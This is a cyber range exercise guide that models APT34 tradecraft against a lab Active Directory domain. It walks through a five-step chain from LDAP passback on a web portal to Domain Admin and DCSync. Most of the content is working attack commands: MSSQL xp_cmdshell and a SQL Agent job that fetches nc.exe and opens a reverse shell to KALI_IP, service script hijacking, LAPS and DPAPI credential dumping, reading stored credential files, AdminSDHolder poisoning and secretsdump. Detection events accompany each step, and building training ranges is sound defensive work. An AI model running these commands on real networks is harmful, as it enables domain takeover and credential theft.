# APT34 Operation HOLLOW CROWN — Active Directory LDAP & Service Exploitation Cyber Range

**Classification:** UNCLASSIFIED // EXERCISE ONLY
**Domain Theme:** Corporate Enterprise — Technology Services AD Infrastructure
**Network:** cyberange.local
**Platform:** Windows Server 2019 — OpenStack / QEMU-KVM

---

## Machine Summary

| # | Hostname | Role | Vulnerability | MITRE ATT&CK |
|---|----------|------|---------------|---------------|
| M1 | DC03 | Domain Controller (AD DS + DNS) | AdminSDHolder WriteDACL misconfiguration, LAPS schema deployed | T1098, T1003.006 |
| M2 | SRV08-WEB | IIS Web Frontend | LDAP admin portal with default creds (admin:admin), LDAP passback vulnerability | T1190, T1552.001 |
| M3 | SRV09-SQL | MSSQL Database Server | IMPERSONATE privilege on sa, SQL Agent CmdExec as svc_dev | T1059.003, T1078.002 |
| M4 | SRV10-DEV | Development/Build Server | Weak service ACL (SERVICE_CHANGE_CONFIG), CorpBuildSvc runs as svc_build (LAPS reader) | T1574.011, T1003.001 |
| M5 | SRV11-JUMP | Jump/Bastion Server | LAPS-managed local admin, DPAPI credential vault with svc_itadmin RDP creds | T1555.004, T1098 |

---

## Credential Chain

```
M2 LDAP Passback  →  svc_ldap : Ld@pB1nd#2025!  (captured via rogue LDAP listener)
M3 SQL EXECUTE AS →  IMPERSONATE sa  →  SQL Agent CmdExec  →  shell as svc_dev
M4 Service Hijack →  svc_dev modifies CorpBuildSvc script  →  runs as svc_build  →  reads LAPS password for SRV11-JUMP
M5 LAPS + DPAPI   →  local admin via LAPS  →  DPAPI decrypt  →  svc_itadmin : 1tAdm!nSvc#2025
M1 AdminSDHolder  →  svc_itadmin WriteDACL on AdminSDHolder  →  GenericAll propagated via SDProp  →  Domain Admin  →  DCSync
```

---

## Attack Flow (5 Steps)

### Step 1 — LDAP Passback via Default Admin Portal (SRV08-WEB)

SRV08-WEB hosts a corporate management portal at `/admin` with default credentials `admin:admin`. The LDAP Configuration page has a "Test Connection" button that sends LDAP Simple Bind requests (AuthType.Basic — cleartext) to whatever server is configured. The attacker changes the LDAP Server field to their Kali IP, starts a listener, and clicks "Test Connection" to capture `svc_ldap` credentials.

**Tools:** nc/responder (LDAP listener), browser
**Detection:** Event 4624 Type 3 on DC03 for svc_ldap from unexpected source. Outbound LDAP (389/TCP) from SRV08-WEB to non-DC IP.

```
# Start rogue LDAP listener on Kali
sudo responder -I eth0 -wv
# OR: nc -nlvp 389

# Browse to http://SRV08-WEB/admin/ → login admin:admin
# Change LDAP Server to KALI_IP → click "Test Connection"
# Capture: svc_ldap / Ld@pB1nd#2025!

# Verify
nxc smb DC03 -u svc_ldap -p 'Ld@pB1nd#2025!' -d cyberange.local
```

**Contingencies:**
- **C1a:** `web.config.bak` in IIS wwwroot contains svc_ldap creds: `curl -s http://SRV08-WEB/web.config.bak`
- **C1b:** `/docs/infrastructure.html` has LDAP connection details: `curl -s http://SRV08-WEB/docs/infrastructure.html`
- **C1c:** `WebBackups$` hidden share has old IIS export with creds: `smbclient //SRV08-WEB/WebBackups$ -U 'CYBERANGE/svc_ldap%Ld@pB1nd#2025!' -c "ls"`
- **SKIP-A:** svc_ldap has ForceChangePassword on svc_build — skip Steps 2+3: `net rpc password svc_build 'NewP@ss!2025' -U 'CYBERANGE/svc_ldap%Ld@pB1nd#2025!' -S DC03`

---

### Step 2 — MSSQL EXECUTE AS Impersonation + SQL Agent Job (SRV09-SQL)

`svc_ldap` has a Windows login on SRV09-SQL with `IMPERSONATE` privilege on `sa`. The attacker connects via `impacket-mssqlclient`, escalates to sa context, enables `xp_cmdshell`, and creates a SQL Agent Job with CmdExec subsystem. The Agent service runs as `svc_dev`, so CmdExec steps execute OS commands as `cyberange\svc_dev`.

**Tools:** impacket-mssqlclient, nc.exe
**Detection:** Event 4624 on SRV09-SQL for svc_ldap. SQL Audit logs for EXECUTE AS and sp_add_job. Event 4688 for cmd.exe spawned by sqlservr.exe.

```
# Connect to MSSQL
impacket-mssqlclient 'CYBERANGE/svc_ldap:Ld@pB1nd#2025!@SRV09-SQL' -windows-auth

# Escalate
EXECUTE AS LOGIN = 'sa';
EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
EXEC xp_cmdshell 'whoami';
-- Output: cyberange\svc_dev

# SQL Agent reverse shell
USE msdb;
EXEC sp_add_job @job_name = 'SysCheck';
EXEC sp_add_jobstep @job_name = 'SysCheck', @step_name = 'run', @subsystem = 'CmdExec', @command = 'cmd /c net use \\KALI_IP\share /user:att att && \\KALI_IP\share\nc.exe -e cmd KALI_IP 4444';
EXEC sp_add_jobserver @job_name = 'SysCheck';
EXEC sp_start_job @job_name = 'SysCheck';
```

**Contingencies:**
- **C2a:** TRUSTWORTHY DB + db_owner: `USE DevAppDB; EXECUTE AS USER = 'dbo'; EXEC xp_cmdshell 'whoami';`
- **C2b:** OLE Automation: `DECLARE @s INT; EXEC sp_OACreate 'WScript.Shell', @s OUTPUT; EXEC sp_OAMethod @s, 'Run', NULL, 'cmd /c whoami > C:\temp\out.txt';`
- **C2c:** CLR Assembly: `USE DevAppDB; EXEC dbo.sp_clr_exec 'whoami';`
- **SKIP-B:** ServiceCredentials table: `USE DevAppDB; SELECT * FROM dbo.ServiceCredentials;` — row 4 has svc_itadmin creds, skip to Step 5

---

### Step 3 — Weak Service ACL → Script Modification → svc_build (SRV10-DEV)

`svc_dev` connects to SRV10-DEV via evil-winrm. CorpBuildSvc (NSSM-wrapped PowerShell service) runs as `svc_build`. The service script (`C:\BuildService\BuildMonitor.ps1`) is writable by `svc_dev`. The attacker replaces the script content, restarts the service, and the payload executes as `svc_build`. `svc_build` is a member of `BuildOps` which has `ReadLAPSPassword` on the Servers OU.

**Tools:** evil-winrm, nxc
**Detection:** Event 4624 on SRV10-DEV for svc_dev via WinRM. File modification on BuildMonitor.ps1. Event 7036 (service state change) for CorpBuildSvc.

```
# WinRM to SRV10-DEV as svc_dev
evil-winrm -i SRV10-DEV -u svc_dev -p 'D3v$3rv!c3#2025'

# Modify service script
sc.exe stop CorpBuildSvc
Set-Content -Path "C:\BuildService\BuildMonitor.ps1" -Value 'whoami | Set-Content C:\BuildService\hijack.txt'
sc.exe start CorpBuildSvc
# hijack.txt contains: cyberange\svc_build

# Read LAPS password from svc_build context
powershell -c "$s = New-Object DirectoryServices.DirectorySearcher; $s.Filter = '(cn=SRV11-JUMP)'; $s.PropertiesToLoad.Add('ms-Mcs-AdmPwd') | Out-Null; $r = $s.FindOne(); $r.Properties['ms-mcs-admpwd']"

# Or from Kali
nxc ldap DC03 -u svc_build -p 'Bu1ld@cc#2025!' -M laps
```

**Contingencies:**
- **C3a:** Unquoted service path CorpDevTools: `wmic service get name,pathname | findstr /v "C:\Windows" | findstr /v "\""`
- **C3b:** NightlyBuildClean scheduled task — writable folder, runs as svc_build: `schtasks /query /tn NightlyBuildClean /fo LIST /v`
- **C3c:** AlwaysInstallElevated: `reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated`

---

### Step 4 — LAPS Password Read + DPAPI Credential Vault Extraction (SRV11-JUMP)

The attacker authenticates to SRV11-JUMP using the LAPS-managed local Administrator password. As local admin, DPAPI-protected credential blobs in `svc_itadmin`'s profile are extracted and decrypted, revealing RDP saved credentials for DC03 containing `svc_itadmin`'s domain password.

**Tools:** nxc (laps module, dpapi module), mimikatz, impacket-psexec
**Detection:** Event 4624 Type 3 on SRV11-JUMP with local Administrator. LSASS process access (Sysmon 10). DPAPI master key enumeration.

```
# Read LAPS password
nxc ldap DC03 -u svc_build -p 'Bu1ld@cc#2025!' -M laps

# Auth to SRV11-JUMP
nxc smb SRV11-JUMP -u Administrator -p 'LAPS_PASSWORD' --local-auth

# DPAPI extraction
nxc smb SRV11-JUMP -u Administrator -p 'LAPS_PASSWORD' --local-auth --dpapi
# Output: svc_itadmin : 1tAdm!nSvc#2025

# Verify
nxc smb DC03 -u svc_itadmin -p '1tAdm!nSvc#2025' -d cyberange.local
```

**Contingencies:**
- **C4a:** AutoLogon registry: `nxc smb SRV11-JUMP -u Administrator -p 'LAPS_PW' --local-auth -x "reg query \"HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\" /v DefaultPassword"`
- **C4b:** PSReadline history: `nxc smb SRV11-JUMP -u Administrator -p 'LAPS_PW' --local-auth -x "type C:\Users\svc_itadmin\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt"`
- **C4c:** Unattend.xml: `nxc smb SRV11-JUMP -u Administrator -p 'LAPS_PW' --local-auth -x "type C:\Windows\Panther\Unattend.xml"`

---

### Step 5 — AdminSDHolder Poisoning → SDProp → Domain Admin (DC03)

`svc_itadmin` has `WriteDACL` on the AdminSDHolder container. The attacker writes a `GenericAll` ACE for `svc_itadmin` on AdminSDHolder. SDProp (running every 2 minutes via lab accelerator) propagates this ACE to all protected groups including Domain Admins. The attacker adds themselves to Domain Admins and performs DCSync.

**Tools:** bloodyAD/dacledit, impacket-secretsdump
**Detection:** Event 5136 on DC03 (AdminSDHolder DACL modified). Event 4728/4756 (DA group membership change). Event 4662 (DCSync replication).

```
# Write GenericAll on AdminSDHolder
bloodyAD -d cyberange.local -u svc_itadmin -p '1tAdm!nSvc#2025' --host DC03 \
    add genericAll 'CN=AdminSDHolder,CN=System,DC=cyberange,DC=local' svc_itadmin

# Wait for SDProp (2 min cycle in lab)
sleep 150

# Add self to Domain Admins
net rpc group addmem "Domain Admins" "svc_itadmin" \
    -U 'CYBERANGE/svc_itadmin%1tAdm!nSvc#2025' -S DC03

# DCSync
impacket-secretsdump 'CYBERANGE/svc_itadmin:1tAdm!nSvc#2025@DC03'
```

**Contingencies:**
- **C5a:** svc_itadmin WriteProperty on Backup Operators: `net rpc group addmem "Backup Operators" "svc_itadmin" -U 'CYBERANGE/svc_itadmin%1tAdm!nSvc#2025' -S DC03` → `reg save HKLM\SAM` + secretsdump offline
- **C5b:** Writable GPO (DC-HealthCheck-Policy) on Domain Controllers OU: `pygpoabuse.py` to add svc_itadmin to DA via GPO scheduled task

---

## Setup Order

```
1. M1-DC03       — Domain Controller (creates forest)
2. M2-SRV08-WEB  — Join domain, install IIS, deploy LDAP admin portal
3. M3-SRV09-SQL  — Join domain, install MSSQL, configure logins
4. M4-SRV10-DEV  — Join domain, install NSSM, create CorpBuildSvc
5. M5-SRV11-JUMP — Join domain, install LAPS client, cache DPAPI creds
6. M1-DC03 (again) — Post-join: LAPS GPO, AdminSDHolder ACL, SPNs
```

---

## OpenStack Network Assignment

| Machine | Network | Key Ports |
|---------|---------|-----------|
| DC03 | lab-net | 53, 88, 135, 389, 636, 445, 5985 |
| SRV08-WEB | lab-net | 80 (IIS), 445 |
| SRV09-SQL | lab-net | 1433 (MSSQL), 445 |
| SRV10-DEV | lab-net | 445, 5985 (WinRM) |
| SRV11-JUMP | lab-net | 445, 3389 (RDP), 5985 |

---

## APT34 Technique Mapping

This range models APT34 (OilRig / EUROPIUM) tradecraft. APT34 is attributed to Iran's Ministry of Intelligence and Security (MOIS) and is known for:

* Web application exploitation for initial access (Mandiant APT34 report 2019)
* Credential harvesting from network services and databases
* Service manipulation for persistence and lateral movement
* Active Directory abuse for domain dominance

| Step | Technique | MITRE ID | APT34 Precedent |
|------|-----------|----------|-----------------|
| 1 | Exploit Public-Facing Application | T1190 | Web portal exploitation for credential capture |
| 2 | Valid Accounts: Domain | T1078.002 | SQL database access with harvested credentials |
| 3 | Hijack Execution Flow: Services | T1574.011 | Service binary modification for code execution |
| 4 | Credentials from Password Stores | T1555.004 | DPAPI credential extraction from cached vaults |
| 5 | Account Manipulation | T1098 | AdminSDHolder poisoning for persistent domain access |
